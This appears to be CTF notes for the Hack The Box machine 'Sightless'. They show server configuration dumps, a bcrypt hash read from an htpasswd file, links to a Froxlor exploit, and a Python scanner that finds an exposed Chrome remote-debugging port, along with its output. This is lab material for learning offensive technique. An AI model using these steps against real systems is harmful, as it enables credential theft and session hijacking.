drwxr-xr-x 2 root root 4096 Sep  3 11:55 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Sep  3 11:55 /etc/apache2/sites-enabled
-rw-r--r-- 1 root root 770 Sep  3 11:55 /etc/apache2/sites-enabled/10_froxlor_ipandport_192.168.1.118.80.conf
<VirtualHost 192.168.1.118:80>
DocumentRoot "/var/www/html/froxlor"
 ServerName admin.sightless.htb
  <Directory "/lib/">
    <Files "userdata.inc.php">
    Require all denied
    </Files>
  </Directory>
  <DirectoryMatch "^/(bin|cache|logs|tests|vendor)/">
    Require all denied
  </DirectoryMatch>
  <FilesMatch \.(php)$>
    <If "-f %{SCRIPT_FILENAME}">
  	SetHandler proxy:unix:/var/lib/apache2/fastcgi/1-froxlor.panel-admin.sightless.htb-php-fpm.socket|fcgi://localhost
    </If>
  </FilesMatch>
  <Directory "/var/www/html/froxlor/">
      CGIPassAuth On
  </Directory>
</VirtualHost>
-rw-r--r-- 1 root root 917 Sep  3 11:55 /etc/apache2/sites-enabled/34_froxlor_normal_vhost_web1.sightless.htb.conf
<VirtualHost 192.168.1.118:80>
  ServerName web1.sightless.htb
  ServerAlias *.web1.sightless.htb
  ServerAdmin john@sightless.htb
  DocumentRoot "/var/customers/webs/web1"
  <Directory "/var/customers/webs/web1/">
  <FilesMatch \.(php)$>
    <If "-f %{SCRIPT_FILENAME}">
      SetHandler proxy:unix:/var/lib/apache2/fastcgi/1-web1-web1.sightless.htb-php-fpm.socket|fcgi://localhost
    </If>
  </FilesMatch>
    CGIPassAuth On
    Require all granted
    AllowOverride All
  </Directory>
  Alias /goaccess "/var/customers/webs/web1/goaccess"
  LogLevel warn
  ErrorLog "/var/customers/logs/web1-error.log"
  CustomLog "/var/customers/logs/web1-access.log" combined
</VirtualHost>
-rw-r--r-- 1 root root 1480 Aug  2 09:05 /etc/apache2/sites-enabled/002-sqlpad.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName sqlpad.sightless.htb
	ServerAlias sqlpad.sightless.htb
	ProxyPreserveHost On
	ProxyPass         / http://127.0.0.1:3000/
	ProxyPassReverse  / http://127.0.0.1:3000/
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
-rw-r--r-- 1 root root 264 Sep  3 11:55 /etc/apache2/sites-enabled/05_froxlor_dirfix_nofcgid.conf
  <Directory "/var/customers/webs/">
    Require all granted
    AllowOverride All
  </Directory>
lrwxrwxrwx 1 root root 35 May 15  2024 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost 127.0.0.1:8080>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html/froxlor
	ServerName admin.sightless.htb
	ServerAlias admin.sightless.htb
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
-rw-r--r-- 1 root root 412 Sep  3 11:55 /etc/apache2/sites-enabled/40_froxlor_diroption_666d99c49b2986e75ed93e591b7eb6c8.conf
<Directory "/var/customers/webs/web1/goaccess/">
  AuthType Basic
  AuthName "Restricted Area"
  AuthUserFile /etc/apache2/froxlor-htpasswd/1-666d99c49b2986e75ed93e591b7eb6c8.htpasswd
  require valid-user
</Directory>

drwxr-xr-x 2 root root 4096 Aug  9 11:17 /etc/nginx/sites-enabled
drwxr-xr-x 2 root root 4096 Aug  9 11:17 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 34 May 21 18:06 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
server {
    listen *:80;
    server_name sightless.htb;
    location / {
        root /var/www/sightless;
        index index.html;
    }
    if ($host != sightless.htb) {
        rewrite ^ http://sightless.htb/;
    }
}
-rw-r--r-- 1 root root 249 Aug  9 07:18 /etc/nginx/sites-enabled/main
server {
	listen 80;
	server_name sqlpad.sightless.htb;
	location / {
		proxy_pass http://localhost:3000;
		proxy_set_header Host $host;
		proxy_set_header X-Real-IP $remote_addr;
		proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
	}
}


-rw-r--r-- 1 root root 1414 Aug  9 07:04 /etc/apache2/sites-available/000-default.conf
<VirtualHost 127.0.0.1:8080>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html/froxlor
	ServerName admin.sightless.htb
	ServerAlias admin.sightless.htb
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 May 15  2024 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost 127.0.0.1:8080>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html/froxlor
	ServerName admin.sightless.htb
	ServerAlias admin.sightless.htb
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

╔══════════╣ Analyzing FTP Files (limit 70)
-rw-r--r-- 1 root root 5922 May 15  2024 /etc/vsftpd.conf
anonymous_enable=YES
local_enable
#write_enable=YES
#anon_upload_enable=YES
#anon_mkdir_write_enable=YES
#chown_uploads=YES
#chown_username=whoever
anon_root=/var/ftp/

-rw-r--r-- 1 root root 69 May  1  2024 /etc/php/8.1/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Jun 14 15:52 /usr/share/php8.1-common/common/ftp.ini
```

froxolr hash:
```bash
michael@sightless:/tmp$ cat /etc/apache2/froxlor-htpasswd/1-666d99c49b2986e75ed93e591b7eb6c8.htpasswd
web1:$2y$10$X5tjC19boiHf81unjwyFFuELwOVBDyEJMlm/eG9Ks6qpxli/L3Cii
```

namethathash output:
```bash
$2y$10$X5tjC19boiHf81unjwyFFuELwOVBDyEJMlm/eG9Ks6qpxli/L3Cii

Most Likely 
bcrypt, HC: 3200 JtR: bcrypt
Blowfish(OpenBSD), HC: 3200 JtR: bcrypt Summary: Can be used in Linux Shadow Files.
Woltlab Burning Board 4.x,
```

froxlor cve:
```bash
https://github.com/advisories/GHSA-x525-54hf-xr53
https://github.com/mhaskar/CVE-2023-0315
```

reverse proxy:
![image](https://github.com/user-attachments/assets/145529f5-b01e-45c8-99c2-e486f3b0cf02)

chrome debugger port finder:
```bash
chrome-debug-port-scanner.py 
import socket
import json
import requests
from concurrent.futures import ThreadPoolExecutor
import sys

def check_port(port):
    """
    Check if a port is open and if it's a Chrome debug port
    """
    try:
        # First check if port is open
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex(('127.0.0.1', port))
        sock.close()
        
        if result == 0:  # Port is open
            try:
                # Check if it's a Chrome debug port
                response = requests.get(f'http://localhost:{port}/json/version', timeout=2)
                if response.status_code == 200:
                    data = response.json()
                    if 'Browser' in data and 'Chrome' in data['Browser']:
                        print(f"\n[+] Found Chrome debug port: {port}")
                        print("\nDebug Interface Info:")
                        print(json.dumps(data, indent=2))
                        print("\nPotential WebSocket URL:", data.get('webSocketDebuggerUrl', 'Not found'))
                        return True
            except requests.exceptions.RequestException:
                pass
    except:
        pass
    return False

def scan_ports(start_port=1024, end_port=65535):
    """
    Scan ports to find Chrome debug interface
    """
    print(f"[*] Scanning ports {start_port}-{end_port} for Chrome debug interface...")
    
    # Create chunks of ports for faster scanning
    CHUNK_SIZE = 1000
    port_chunks = [(i, min(i + CHUNK_SIZE, end_port)) 
                   for i in range(start_port, end_port, CHUNK_SIZE)]
    
    def scan_chunk(chunk_start, chunk_end):
        for port in range(chunk_start, chunk_end):
            sys.stdout.write(f"\r[*] Scanning port {port}")
            sys.stdout.flush()
            if check_port(port):
                return port
        return None
    
    # Use ThreadPoolExecutor for parallel scanning
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(scan_chunk, chunk[0], chunk[1]) 
                  for chunk in port_chunks]
        
        for future in futures:
            result = future.result()
            if result:
                print("\n\n[+] To connect to the debugger:")
                print(f"1. Open Chrome/Chromium browser")
                print(f"2. Navigate to: chrome://inspect")
                print(f"3. Click 'Configure...' and add localhost:{result}")
                print(f"4. Look under 'Remote Target' for inspectable pages")
                return result
    
    print("\n[-] No Chrome debug port found")
    return None

def test_connection(port):
    """
    Test connection to debug port and list available targets
    """
    try:
        response = requests.get(f'http://localhost:{port}/json/list')
        if response.status_code == 200:
            targets = response.json()
            print("\n[+] Available debug targets:")
            for target in targets:
                print(f"\nTitle: {target.get('title', 'Unknown')}")
                print(f"Type: {target.get('type', 'Unknown')}")
                print(f"URL: {target.get('url', 'Unknown')}")
                print(f"WebSocket Debugger URL: {target.get('webSocketDebuggerUrl', 'Unknown')}")
            return True
    except:
        print("\n[-] Failed to list debug targets")
        return False

def main():
    # Try common debug ports first
    common_ports = [9222, 9223, 9224, 9229, 22222]
    print("[*] Checking common debug ports first...")
    
    for port in common_ports:
        sys.stdout.write(f"\r[*] Checking port {port}")
        sys.stdout.flush()
        if check_port(port):
            test_connection(port)
            return
    
    # If common ports fail, do a full scan
    print("\n[*] Common ports not found, starting full scan...")
    found_port = scan_ports(1024, 65535)
    
    if found_port:
        test_connection(found_port)

if __name__ == "__main__":
    main()
```

chrome port finder output:
```bash
[*] Checking common debug ports first...
[*] Checking port 22222
[*] Common ports not found, starting full scan...
[*] Scanning ports 1024-65535 for Chrome debug interface...
[*] Scanning port 41977
[+] Found Chrome debug port: 36995
[*] Scanning port 41988
Debug Interface Info:
{
  "Browser": "HeadlessChrome/125.0.6422.60",
  "Protocol-Version": "1.3",
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.6422.60 Safari/537.36",
  "V8-Version": "12.5.227.8",
  "WebKit-Version": "537.36 (@3ac3319bff9f3e139d632e3d195e3d2d43d86e37)",
  "webSocketDebuggerUrl": "ws://localhost:36995/devtools/browser/3a800765-c483-4f86-a6b7-0b4be402824c"
}

Potential WebSocket URL: ws://localhost:36995/devtools/browser/3a800765-c483-4f86-a6b7-0b4be402824c
[*] Scanning port 44203

[*] Scanning port 39897ebugger:
1. Open Chrome/Chromium browser
2. Navigate to: chrome://inspect
3. Click 'Configure...' and add localhost:36995
[*] Scanning port 436874. Look under 'Remote Target' for inspectable pages
[*] Scanning port 64023
[+] Available debug targets:

Title: Froxlor
Type: page
URL: http://admin.sightless.htb:8080/
WebSocket Debugger URL: ws://localhost:36995/devtools/page/1D789DAC3149D1BC05D208ECE7C21B74
```

chrome debugger output:
```bash
![image](https://github.com/user-attachments/assets/1c9c7a1b-a319-42ea-946e-f3f42da98f16)
```
